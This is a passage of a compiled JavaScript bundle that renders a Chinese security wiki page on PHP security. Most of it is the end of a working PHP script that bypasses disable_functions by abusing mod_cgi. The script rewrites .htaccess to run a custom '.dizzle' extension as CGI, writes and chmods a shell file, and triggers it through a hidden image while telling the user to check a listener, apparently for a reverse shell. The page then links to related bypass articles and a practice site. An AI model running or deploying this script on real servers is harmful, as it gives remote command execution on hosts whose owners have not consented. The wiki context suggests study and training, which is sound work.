",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_SERVER"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'PHP_SELF'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'?checked=true'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//execute the script again to see if the htaccess test worked"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$modcgi")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"in_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'mod_cgi'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"apache_get_modules"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// mod_cgi enabled?"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$writable")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"is_writable"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'.'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//current dir writable?"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$htaccess")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"!"),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"empty"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_SERVER"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'HTACCESS'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//htaccess enabled?"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Mod-Cgi enabled"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$modcgi"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Yes"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"No"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Is writable"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$writable"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Yes"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"No"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"htaccess working"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$htaccess"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Yes"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"No"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"if"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"!"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$modcgi")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&&")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$writable")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&&")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$htaccess"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Error. All of the above must be true for the script to work!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//abort if not"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"else"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Backing up .htaccess"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"copy"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'".htaccess"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'".htaccess.bak"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Suceeded! Saved in .htaccess.bak"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Failed!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//make a backup, cause you never know."),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Write .htaccess file"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_put_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'.htaccess'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Options +ExecCGI\\nAddHandler cgi-script .dizzle"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Succeeded!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Failed!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//.dizzle is a nice extension"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Write shell file"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"file_put_contents"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'shell.dizzle'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$shellfile"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Succeeded!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Failed!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//write the file"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"checkEnabled"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Chmod 777"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"chmod"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"shell.dizzle"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0777"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Succeeded!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Failed!"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//rwx"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),"\"Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>\""),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";")," ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"//call the script"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("h3",{className:"__internal",id:"通过antsword看绕过disable_functions"},Object(p.b)("a",c({parentName:"h3"},{href:"https://www.anquanke.com/post/id/195686#h3-3",target:"_blank"}),"通过Antsword看绕过disable_functions"),Object(p.b)("a",c({parentName:"h3"},{href:"#%E9%80%9A%E8%BF%87antsword%E7%9C%8B%E7%BB%95%E8%BF%87disable_functions","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("h1",{className:"__internal",id:"php安全练习网站"},"PHP安全练习网站",Object(p.b)("a",c({parentName:"h1"},{href:"#php%E5%AE%89%E5%85%A8%E7%BB%83%E4%B9%A0%E7%BD%91%E7%AB%99","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("a",c({parentName:"p"},{href:"https://www.ripstech.com/php-security-calendar-2017/",target:"_blank"}),"https://www.ripstech.com/php-security-calendar-2017/")))}i.isMDXComponent=!0,i=Object(s.hot)(e)(i),(o="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(o.register(m,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\phpsec.md"),o.register(N,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\phpsec.md"),o.register(l,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\phpsec.md"),o.register(i,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\web\\phpsec.md")),(r="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&r(e)}.call(this,n(23)(e))}}]);